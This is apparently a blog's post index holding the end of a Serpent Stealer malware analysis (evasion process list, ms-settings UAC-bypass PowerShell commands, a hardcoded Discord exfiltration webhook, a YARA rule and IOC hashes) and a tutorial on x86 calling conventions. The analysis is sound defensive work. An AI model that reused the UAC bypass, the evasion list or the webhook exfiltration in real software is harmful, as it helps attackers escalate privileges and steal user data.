evasion.&quot;ProcessHacker.exe&quot;,&quot;httpdebuggerui.exe&quot;,&quot;wireshark.exe&quot;,&quot;fiddler.exe&quot;,&quot;regedit.exe&quot;,&quot;cmd.exe&quot;,&quot;taskmgr.exe&quot;,&quot;vboxservice.exe&quot;,&quot;df5serv.exe&quot;,&quot;processhacker.exe&quot;,&quot;vboxtray.exe&quot;,&quot;vmtoolsd.exe&quot;,&quot;vmwaretray.exe&quot;,&quot;ida64.exe&quot;,&quot;ollydbg.exe&quot;,&quot;pestudio.exe&quot;,&quot;vmwareuser.exe&quot;,&quot;vgauthservice.exe&quot;,&quot;vmacthlp.exe&quot;,&quot;vmsrvc.exe&quot;,&quot;x32dbg.exe&quot;,&quot;x64dbg.exe&quot;,&quot;x96dbg.exe&quot;,&quot;vmusrvc.exe&quot;,&quot;prl_cc.exe&quot;,&quot;prl_tools.exe&quot;,&quot;qemu-ga.exe&quot;,&quot;joeboxcontrol.exe&quot;,&quot;ksdumperclient.exe&quot;,&quot;xenservice.exe&quot;,&quot;joeboxserver.exe&quot;,&quot;devenv.exe&quot;,&quot;IMMUNITYDEBUGGER.EXE&quot;,&quot;ImportREC.exe&quot;,&quot;reshacker.exe&quot;,&quot;windbg.exe&quot;,&quot;32dbg.exe&quot;,&quot;64dbg.exex&quot;,&quot;protection_id.exex&quot;,&quot;scylla_x86.exe&quot;,&quot;scylla_x64.exe&quot;,&quot;scylla.exe&quot;,&quot;idau64.exe&quot;,&quot;idau.exe&quot;,&quot;idaq64.exe&quot;,&quot;idaq.exe&quot;,&quot;idaq.exe&quot;,&quot;idaw.exe&quot;,&quot;idag64.exe&quot;,&quot;idag.exe&quot;,&quot;ida64.exe&quot;,&quot;ida.exe&quot;,&quot;ollydbg.exe&quot;,UAC BypassThis malware sample employs a UAC (User Account Control) Bypass using three PowerShell commands. The first command creates a new registry entry. The second, adds a new property to this entry, crucial for the bypass mechanism. The third command, sets a specific value to this entry, thus allowing the malware to execute commands without UAC intervention.New-Item “HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command” -ForceNew-ItemProperty -Path “HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command” -Name “DelegateExecute” -Value “” -ForceSet-ItemProperty -Path “HKCU:\\\\Software\\\\Classes\\\\ms-settings\\\\Shell\\\\Open\\\\command” -Name “(default)” -Value \\&quot;{0}\\&quot; -ForceData ExfiltrationOnce it has gathered all the data set to be stolen, the Serpent Stealer initiates a request to checkip.dyndns.org. This action is undertaken to acquire the public IP address of the infected machine. Subsequently, it proceeds to transmit all the accumulated data to a Discord server, utilizing a webhook for this purpose. This sequence of actions highlights the malware’s methodical approach in executing its data exfiltration process.public static string Webhook_link = &quot;https://discord.com/api/webhooks/1156720932375756921/Xu5g1XzMRXTKDzrIOMcPMC1orYzXGQKBYTTRVOX4oR-IbivHh0LzqCucl2b-obrco6jj&quot;;This particular sample appears to be from the early stages of development, as evidenced by numerous informative messages within the malware’s code. For instance, lines likeConsole.WriteLine(&quot;[+] Program finished.&quot;);Console.WriteLine(&quot;[-] Target does not have FTP.&quot;);suggest a debugging phase. Additionally, as previously mentioned, the hardcoded folder path C:\\Users\\Aperx\\Desktop left in the malware indicates an oversight. These factors lead to the conclusion that this file was likely not ready for widespread distribution in a malware campaign and was still a work in progress.The absence of obfuscation, encryption, or any form of packing in this malware allows for a straightforward understanding of its capabilities just by examining its function names. Due to this simplicity, an in-depth analysis of each function is unnecessary. It is, in essence, a typical copy/paste .NET stealer.Part 2 - Hunting for New SamplesIn Part 2 of our article, focused on Hunting for New Samples, we encounter a variety of specific strings within the ‘Serpent Stealer’ sample. Among these, C:\\\\Users\\\\Aperx\\\\Desktop emerges as particularly indicative of the developer’s involvement. This string has guided our search efforts.Searching “Users\\\\Aperx\\\\” in VirusTotal, we have identified 11 instances that match this criterion. The following is the list of these matches. File Name File Hash Detections First Seen SerpentPremium.dll 382b9a9dcae2166c4b1ec4c2010104c62e2afb170605bd39c0feee622d5d29e9 1 / 72 2023-12-31 RsrcPractice.exe 202fca883d2e6db7d7259ed11cbf0b4ba58c5ead3640b5ee09b9aca823a49cb0 49 / 72 2023-12-01 RsrcPractice.exe 078d6a0e208fe8ab036aaa62b0f325a2583a7b1a74e7ae50298e0db2b31274ef 50 / 72 2023-11-30 nitrohax.dll ce70fe6f2fb6dc0f1abd000659db50d4bb549210ff8b4850d81c963587d83041 3 / 64 2023-11-11 No name 3dd96e139d320c5cd4e7f46ef5fa3d119af54659f7210659a5f91c11db3a3f45 20 / 61 2023-11-04 Nigga.pdf.lnk 29e7761575e0a8d4c732a0a0221c90606613b9233be55fb809278a0c4a6e75b6 25 / 61 2023-11-04 Serpent.dll 4c6cbc32e63a918cfa0ffc7486fb3210aeb2d9b08e6e4f7976582215acc99c41 0 / 72 2023-10-25 Serpent.dll 25c033dd58e3b48b84ec9cb4ffe0c2f9293e7a4b4c81452c49abf7dda61db6ce 27 / 71 2023-10-19 Serpent.dll 212c4eba1bf5f695c563668c09cd3399d484d5bd5945edea97dc1ecbfd3a3eed 43 / 71 2023-10-12 Serpent.dll 6b82bfbdf2e9666bd0c74280ee20c14044fee9d711ae340c8dc388104695b75d 44 / 72 2023-10-12 Serpent.dll 5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d 41 / 72 2023-10-12 New Version AnalysisThe sample discovered on October 25, 2023, stands out notably due to its zero detection rate on VirusTotal, drawing our immediate attention. Let’s proceed to analyze this particular sample in detail, exploring its unique attributes and potential implications.Once more, we find that this file is written in .NET, prompting us to use DNSpy for its analysis. A thorough examination in DNSpy reveals a familiar pattern: the absence of obfuscations or encryptions. Just like its predecessors, it’s a straightforward, cleartext simple stealer, laying bare its functionalities.This particular sample takes a structured approach to data storage. It establishes a new folder labeled ‘Serpent’ in the Temp path, where it systematically stores the pilfered data. The malware accomplishes this by generating individual files within this folder, each containing a segment of the stolen information.Comparing this sample with the first, we observe some key differences. Notably, this version lacks any Anti-Analysis mechanisms. Furthermore, it deviates in its data processing methodology – it accumulates data but stops short of exfiltrating it, choosing instead to store it in the ‘%Temp%\\Serpent&#39; directory. This pattern leads us to speculate that we might be looking at a test version, not fully equipped for deployment in a malware campaign. Additionally, the lack of data exfiltration likely plays a role in its zero detection status, as it reduces the likelihood of triggering security alerts.Serpent PremiumDuring our investigative journey on VirusTotal, using Users\\\\Aperx\\\\ as our search query, we stumbled upon a file called SerpentPremium.dll. Given its ‘Serpent’ nomenclature and the shared folder path, there’s a strong indication that we might be dealing with a new iteration of the ‘Serpent Stealer’. We will now delve into an analysis of ‘SerpentPremium.dll’ to explore its characteristics and validate if it is indeed a new variant.SHA256: 382b9a9dcae2166c4b1ec4c2010104c62e2afb170605bd39c0feee622d5d29e9Upon examining the connections related to SerpentPremium.dll, we discovered that it was extracted from an archive named Cobra-main.zip. This finding prompts us to shift our focus to ‘Cobra-main.zip’.Investigating its associations further, we notice a GitHub link listed under the ‘Memory pattern URLs’ section on VirusTotal. This new lead could unveil additional layers in our exploration of the malware’s origins and associations.https://github.com/0xSerpent/CobraIn the words of its creator, ‘Cobra is a C# Remote Access Tool, made due to the lack of good Remote Access Tools that do not need port forwarding, (and the ones that do exist, sort of suck).’ This tool was co-developed by 0x-Stealth (notably associated with the ‘SerpentStealer’ post on Breach Forums) and m21acro. Cobra mirrors certain aspects of the Serpent Stealer, notably in its use of the same UAC bypass technique.string powershellScript = @&quot; New-Item &quot;&quot;HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command&quot;&quot; -Force New-ItemProperty -Path &quot;&quot;HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command&quot;&quot; -Name &quot;&quot;DelegateExecute&quot;&quot; -Value &quot;&quot;&quot;&quot; -Force Set-ItemProperty -Path &quot;&quot;HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command&quot;&quot; -Name &quot;&quot;(default)&quot;&quot; -Value $program -Force&quot;;Additionally, it operates independently of a traditional C2 or server infrastructure, being controlled instead by a Discord bot.In our extensive hunt, we also identified a version of ‘Serpent Stealer’ labeled as C++. However, instead of being developed from scratch in C++, it simply involves calling a .NET DLL from C++. The efficacy of our Yara rule extends to both the .NET and C++ versions, hence further analysis of this variant is not deemed necessary.Part 3 - C2 PanelIn this section of our article, Part 3 - C2 Panel, we address claims about C2 Panels associated with SerpentStealer found online. This inclusion is essential for a comprehensive analysis.Interestingly, all the samples we’ve analyzed, identified as Serpent Stealer, showed no signs of interacting with any C2 server. There was a clear absence of any links between the Serpent.dll samples and the C2 server IP addresses mentioned online. Reinforcing this observation, the developer noted in their Breach Forums post that ‘Serpent Stealer uses Discord Webhook to exfiltrate data, no c2 / server required.’ The developer’s precise wording was ‘Outputs Logs to Discord Webhook (No C2/Server Required).Further investigations reveal that another tool developed by the same creator, known as Cobra (Serpent RAT), also utilizes Discord webhooks instead of a traditional C2 server. This consistent pattern suggests with high confidence that this particular threat actor generally opts for Discord webhooks over C2 servers. This observation leads us to question the authenticity of C2 addresses linked to ‘Serpent Stealer’ in various online sources, such as the ones mentioned in a specific tweet. It seems increasingly likely that these C2 addresses might not actually be associated with ‘Serpent Stealer’.Part 4 - Yara Rule / IOCsrule SerpentStealer { meta: author = &quot;tufan - @tufan_gngr&quot; description = &quot;Detects .NET based malware named Serpent Stealer&quot; date = &quot;2024-01-07&quot; references = &quot;https://tufan-gungor.github.io/&quot; strings: $s1 = &quot;serpent&quot; nocase $s2 = &quot;steamclient&quot; nocase $s3 = &quot;steamapikey&quot; nocase $s4 = &quot;discordstealer&quot; nocase $s5 = &quot;historystealer&quot; nocase $s6 = &quot;Users\\\\Aperx&quot; nocase $s7 = &quot;passwordstealer&quot; nocase $s8 = &quot;bookmarkstealer&quot; nocase $s9 = &quot;autofillstealer&quot; nocase condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 5 of them}After implementing our custom Yara rule for detecting ‘Serpent Stealer’ in a Retrohunt on VirusTotal, the search yielded 38 instances of the malware. Subsequently, I compiled SHA256 IOCs of the ‘Serpent Stealer’ from Github contributions by fellow researchers and re-ran my Yara rule against this consolidated list. Impressively, there was a match for 38 out of the 44 hashes.Upon closer examination, we discovered why our match rate wasn’t a complete 44/44. It turns out that 6 hashes, initially thought to be linked to ‘Serpent Stealer’ and shared by other researchers, actually belonged to Exela Stealer. By removing these erroneous hashes from our analysis, we achieved a flawless match of 38/38.Exela Stealer1a4205058e912576a1de66af027cf53f32d862102108d556968647913cb778ce35fbbfeae68bcae26ad9bccc3b983862d27f2053b2706b4aa33d11acf9ab3aca6c14f5983ad0e4c9a31fcf3184332d9e4303f085bf866057f914990ea825fa52789a9e3d6cf07d241935638670c2177e261f395107de0a7aea9e2882363a90837ac6012327bf433286be5e98d8c69633e73e64b017a886f63dafab7d6f68ff9fa753967096145e7e8b0a3d2d4e952ae67f1c9a9974242fa3302287812de0f0edSerpent Stealer00b09f9e47986fcff9506c379e27b2361e40e46fc49c3c4d60c4a8402c857f620edc6f2868e4759f541732d1e7ed6ee648736612bf5bf24f737971a65a558110212c4eba1bf5f695c563668c09cd3399d484d5bd5945edea97dc1ecbfd3a3eed23fdc2c625766231b05a4d49e3435196cadb69154d29dc509a3e5f26393e1a5424db3ebba8ef08d3ec207e45db936f6064bc41dde32ea97b9eb48fa6f20da94825c033dd58e3b48b84ec9cb4ffe0c2f9293e7a4b4c81452c49abf7dda61db6ce2a71d550b7f2be38fa120f3fa0726ce370d2983231d3ab823d99f5d50ce79ca42f38a024861649bbfcea0c53869dc3036a4ddcc7a7a07011e21f17c5ab67abd631634c953506e3a1da501044c5aba27aa3074fb70a0d1c16f89c706a89d0ab51349d4ba8bfc898896d925ddfb43095fa6e486138eb06191fe0ddf9b02651386237c7607ee4ae0741f6e38b7ddd55392d41cdcfc238203dfea24ac87611db83963aa2b8af0f25d926d8a02042e0cf71d6cabb781e00295702541b39fe2a630f9b3c620ede8d0f92f39e80f03cbf84967881789bbb2748cea3e0c51fa552b683714b58cb217a8b42378128d88e873e3eb611f1e0c3f51ba060a0130fe522453e2c4b9e172aec228e7d562461f88fa6c6d176e223726de2c67f3464a432251734e24c6cbc32e63a918cfa0ffc7486fb3210aeb2d9b08e6e4f7976582215acc99c414d5431b80340043b87699c7f245005e55b4de70ff97df548dd9cb3b8902773e959f96183a0c0365d42eeecca53941dfb128449ea93edb2fe6b0ae7a7e36fecda5bafa1993e90a3cdf7dca373fddfa8255d75621ba276299ef119d68f1bc6e85e5ff20ad3f1b84b6e702bed2a9ff8e0510615a1d60dd123a9d3cbd1d9e2b5357d6b82bfbdf2e9666bd0c74280ee20c14044fee9d711ae340c8dc388104695b75d6c237036ebd8275d41def2f8be0fec4e7754f180b0b98f30461396753bd3d2627670c776c8f07236af6d94adf14de1216140c16fa8db44135660c239313fac93908a1af19e0a77317619ca05e7f03f3256ec8f5959a9bb29c31b428547b14f9c979f1c5212a2408dbc8fae1088198e7631a992d306a4178fa1cb0117f936534c9ef28fd1f7eb7a71aae2a3e9d4ff1327a7d5a60a74b18cbb8aae1d31473878b9a9175b2800be17be05d141ad2f7bf2faeef24bd10a455a9478b0d5ba082a287ea9e9e02742cc91156c7bd3bfcac8165855c72480f42b0bc2308ceb5595a883b1aa1f3af70210dd0886ab0f9273acc28b39c35905036b38f2840aa1a18ddaf05cbe2a557fea54a051c55d59e21f0fce4547a0c60ef9b2aa19fe65befa20efa8e5bfafccbcfe72483ce31b6a5382053e29a555932944bed1e4e752376441e57562c4f981f1f532ec827032775c88a45f1b4153c3d27885f189654ad6ee85c709c1cd118e082d2c035da179358c8a3c54b879b6e1b71eec2a965b78aa929b83eb11ce70fe6f2fb6dc0f1abd000659db50d4bb549210ff8b4850d81c963587d83041e60a754c658df7edef8e4785de4b3374b9d0bf3efbc553a617032729e2d0d684e91111aa62210fbfb5e726b10a92463179408ba5741fddb89bfc16d787ade60ef33c32d58671cbcfb1ee150627ee641908bf8ca277d6555cb10edd7787a75344ff2b9589a477499d34853ec843824091d2e6fa1301d5ab3242931afec6845351Additionally, the retrohunt conducted with this Yara rule over the last 90 days on VirusTotal indicated a remarkable accuracy, showing no false positives in the results.References https://breachforums.is/Thread-Serpent-Stealer-1-On-The-Market-Affordable https://twitter.com/karol_paciorek/status/1722590659532447810 https://github.com/ThreatMon/ThreatMon-Reports-IOC/tree/main/Serpent-Stealer-Unmasked-Threat-Analysis-and-Countermeasures https://malpedia.caad.fkie.fraunhofer.de/details/win.serpentI utilized AI assistance to fine-tune certain sentences in this post, enhancing clarity and precision." }, { "title": "Calling Conventions for Reverse Engineering", "url": "/posts/x86-calling-conventions/", "categories": "Reverse Engineering", "tags": "reverse engineering", "date": "2022-07-12 19:00:00 +0300", "snippet": "What is Calling Convention ?The term “calling convention” describes; how arguments passed to the function and how values are returned from functions, whether the caller or the callee will cleans the stack.There are different conventions based on processor, OS and language. Also, not every compiler implements the “calling conventions” the same way. Therefore, only the standard 4 calling conventions will be discussed in this article. __cdecl __stdcall __fastcall __thiscallAlso, developers can sometimes use custom calling conventions. For detailed information on this subject, you can subscribe to OALabs from Patreon and view the __usercall tutorial. They have very good videos on this subject.__cdecl__cdecl (which stands for C declaration) is the default calling convention in C and C++. Therefore, you will come across this definition many times while reading assembly in tools such as IDA and Ghidra.Characteristics of __cdecl: Arguments are passed on the stack in reverse order (pushed right-to-left), Caller cleans the stack. The return value is stored in EAX.Let’s say we have a function called “sumNumbers” and it takes 5 integer arguments, then returns the sum of these numbers.#include &amp;lt;iostream&amp;gt;int sumNumbers(int number1, int number2, int number3, int number4, int number5){ int numSum = number1 + number2 + number3 + number4 + number5; return numSum;}int main(){ int numberSum = 0; numberSum = sumNumbers(1, 2, 3, 4, 5); printf(&quot;Result: %d&quot;,numberSum);}After compiling this code, when we open it in a tool like Ghidra or IDA, it will look like below. As seen in the first box, the arguments were passed to the stack in reverse order, then the function called. Which is the first key point to recognize __cdecl. (1) And in the second box, 0x14 (20) is added to the ESP. As 5 arguments are sent to the stack and each argument takes up 4 bytes, caller cleans the stack 20 byte. (2) In __cdecl, you will usually see the line add esp,&amp;lt;area to be cleaned&amp;gt;, 1 step after the function call. And as seen in the last box, the return value in EAX is passed to the printf function to be printed. (3) Also you can see that, the reverse engineering tools usually recognize calling functions. (Blue Underline in screenshot.) But we still won’t trust the information there too much. We will examine the reason specifically under the “Why are calling conventions important for reverse engineering ? “ part.__stdcall__stdcall is the standard calling convention for Win32 API calls. __stdcall characteristics almost identical with __cdecl calling convention.Characteristics of __stdcall: Arguments are passed on the stack in reverse order (pushed right-to-left), → Same as __cdecl, Callee cleans the stack. The return value is stored in EAX. → Same as __cdecl.As you can see, the only difference between __cdecl and __stdcall is that, in __cdecl calling convention caller cleans the stack, while in __stdcall calling convention callee cleans the stack.In this example we will look at the InternetOpenA API, which takes 5 arguments;HINTERNET InternetOpenA( [in] LPCSTR lpszAgent, [in] DWORD dwAccessType, [in] LPCSTR lpszProxy, [in] LPCSTR lpszProxyBypass, [in] DWORD dwFlags);Let’s compile the code below for analyzing InternetOpenA WIN32 API.#include &amp;lt;iostream&amp;gt;#pragma comment(lib, &quot;wininet.lib&quot;)#include &amp;lt;WinSock2.h&amp;gt;#include &amp;lt;wininet.h&amp;gt;int main(){ std::string RESULT{}; const int size = 4096; char buf[size]; DWORD length; HINTERNET internet = InternetOpenA(&quot;Mozilla/5.0&quot;, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL); if (!internet) ExitProcess(EXIT_FAILURE); HINTERNET response = InternetOpenUrlA(internet, &quot;http://www.google.com&quot;, NULL, NULL, NULL, NULL); if (!response) { InternetCloseHandle(internet); ExitProcess(EXIT_FAILURE); } InternetReadFile(response, buf, size, &amp;amp;length); InternetCloseHandle(response); InternetCloseHandle(internet); std::cout &amp;lt;&amp;lt; buf &amp;lt;&amp;lt; std::endl; return 0;}After compiling this code, when we open it in a tool like Ghidra or IDA, it will look like below. As seen in the first box, the 5 parameters requested by the InternetOpenA API were passed to the stack in reverse order. (1) In the second box, after the InternetOpenA result is returned in EAX, it is moved to the [ebp+hInternet] address and checked if it is equal to 0 or not. (3) As a result, the caller did not take any action to clear the stack. Because the callee (the InternetOpenA function itself) is responsible for stack cleaning. (2)As we showed on Ghidra in the previous example, we can see the calling convention of this function on IDA as well. (Hover mouse over the function name.)__fastcallThe main difference of __fastcall is that the initial arguments are passed to the registers instead of pushing to the stack. It’s faster to keep data in registers than in memory, so it’s called FAST call.Characteristics of __fastcall: First two or three parameters will be passed in the registers EDX, ECX or EAX, and additional parameters are passed on to the stack. The return value is stored in EAX. Callee cleans the stack.The first two DWORD or smaller arguments that are found in the argument list from left to right are passed in ECX and EDX registers; all other arguments are passed on the stack from right to left. (Microsoft)Let’s compile the code below and analyze it in IDA.#include &amp;lt;iostream&amp;gt;int __fastcall TestFunction(int num1, int num2, int num3, int num4, int num5){ int nSum = 0; nSum = num1 + num2 + num3 + num4 + num5; return nSum;}int main(){ int nSum = 0; nSum = TestFunction(10, 20, 30, 40, 50); printf(&quot;Result: %d&quot;, nSum); return 0;} By looking at the first box, you can see that the first 2 parameters are passed in the ECX and EDX and the other parameters are passed on to the stack. (1) In the second box, return value stored in EAX and passed to the printf function. (2) We told that the callee is responsible for stack cleaning (not registers), so in the last box you can see caller cleaning 8 bytes. 8/4=2 parameters. Which they are ECX and EDX.To see how callee handles stack cleaning, let’s jump into that function; Since the first 2 arguments cleaned from ECX and EDX by caller, there is only 3 arguments left to be cleaned from stack. You can see in the box, callee cleans up the stack by using an operand to the retn instruction of 0Ch (12). So the extra 12-bytes (12/4 = 3 arguments) to be cleaned up from stack during the return operation. You can also see that IDA recognizes that this function uses the __fastcall calling convention. __fastcall is the default calling convention for Windows x64 Application Binary Interface (ABI). Unlike x32, it sends the first four parameters to the registers rcx, rdx, r8 and r9, and the remaining parameters to the stack.Integer arguments are passed in registers RCX, RDX, R8, and R9. Floating point arguments are passed in XMM0L, XMM1L, XMM2L, and XMM3L. 16-byte arguments are passed by reference. Parameter passing is described in detail in Parameter passing. These registers, and RAX, R10, R11, XMM4, and XMM5, are considered volatile, or potentially changed by a callee on return. (Microsoft)__thiscallThe Microsoft-specific __thiscall calling convention is used on C++ class member functions on the x86 architecture. (passing the “this” object)Characteristics of __thiscall: Arguments are passed on the stack in reverse order (pushed right-to-left). The “this” object pointer is passed via ECX register. Callee is responsible for stack cleanup.Let’s compile a simple code to analyze __thiscall.#include &amp;lt;iostream&amp;gt;using namespace std;class Numbers {public: int sumNumbers(int num1, int num2);};int Numbers::sumNumbers(int num1,int num2) { int nSum = 0; nSum = num1 + num2; return nSum;}int main() { Numbers myObj; // Create an object of Numbers cout &amp;lt;&amp;lt; myObj.sumNumbers(200,100); // Call the method with an argument return 0;} Parameters (100,200) are passed to the stack in reverse order. Actually, we called as (200,100) The “this” object pointer stored in ECX.To see where the stack cleaning job is done, let’s jump into the function. You can see in the box, callee cleans up the stack by using an operand to the retn instruction of 8. So the extra 8-bytes (8/4 = 2 arguments) to be cleaned up from stack during the return operation. You can also see that IDA recognizes __thiscall.Calling Conventions in GolangSince Go is the most popular programming language lately, let’s also examine how the calling conventions look in the Golang.Let’s compile a simple code to analyze calling conventions in Golang.Since it is the fastest way for me, I compiled the code on a linux system using the following command.env GOOS=windows GOARCH=386 go build -gcflags &#39;-N -l&#39; main.go We used -gcflags &#39;-N -l&#39; parameter to disable compiler optimization.package mainimport &quot;fmt&quot;func sumNumbers(num1, num2, num3 int) int { return num1 + num2 + num3 }func main() { var result int num1 := 3 num2 := 5 num3 := 8 result = sumNumbers(num1, num2, num3) fmt.Println(result)}In this example, the sumNumbers function will add the numbers 3,5 and 8 sent by the main function and return the result, and the main function will print this result to the screen. In the first step, we see that 68 bytes (44h) are allocated in the stack before the operation is performed. In the second step, the parameters are passed to the stack in straight order. In the third step, the sumNumbers function is called and the result returned from the memory address [esp+0Ch] is moved to eax. This is important to us because unlike most other languages, the result is returned in the stack, not the register. Finally, in the fourth step, we see that the fmtPrintln function is called to print the result on the screen, and then the space allocated in the stack for the parameters is cleared. This means that the stack is cleared by the callee. When we compile the code we use in this example for x64, we get the same results.Why are calling conventions important for reverse engineering ?To understand why calling conventions are important, let’s take a step back and look again at our __fastcall example. We analyzed the code we compiled for our __fastcall example using IDA, and everything looked fine. This time, let’s examine the same sample file in the Ghidra tool.Let’s remember the parameter handling method of __fastcall. First two or three parameters will be passed in the registers EDX, ECX or EAX, and additional parameters are passed on to the stack.As you can see in the first box, the first two parameters are passed to ECX and EDX, and the remaining parameters are passed to the stack. But still the Ghidra tool says this function uses the __cdecl calling convention.Therefore, instead of relying on such tools, it will be safer to recognize the calling convention when looking ahead in terms of following the parameters.Test It Yourself !!!If you want to repeat the steps in this article, you can use 3 easy methods;1. Use Online Compiler ExplorerCompiler Explorer is an interactive online compiler which shows the assembly output of compiled C++, Rust, Go (and many more) code.You can see the assembly output by copying the C++ codes used in this article and pasting them into Compiler Explorer.Don’t forget the choose;Language: C++Compiler: x86 msvc v19.latest In this method, you will not see the calling convention. You can interpret it yourself by reading assembly.2. Compile It In Your Local EnvironmentThe codes used in this article were compiled using Visual Studio 2022. You can compile the codes yourself using Visual Studio. Since the functions used in this article are simple and static, if you do not turn off the ‘Compiler Optimization’ feature, you may not see the function call when examining the assembly. ‘Compiler Optimization’ will calculate and compile the result directly instead of compiling the function because the function is static.To disable ‘Compiler Optimization’ in Visual Studio follow the steps; Project - ProjectName Properties - C/C++ - Optimization - Change Optimization to Disabled.3. Download the Files Used in This ArticleYou can download the compiled version of all the codes used in this article from my Github repository.Calling Convention ExamplesReferences OALabs Youtube (Patreon subscription is highly recommended!) Microsoft Calling Conventions Compiler Explorer The Go low-level calling convention on x86-64" } ]
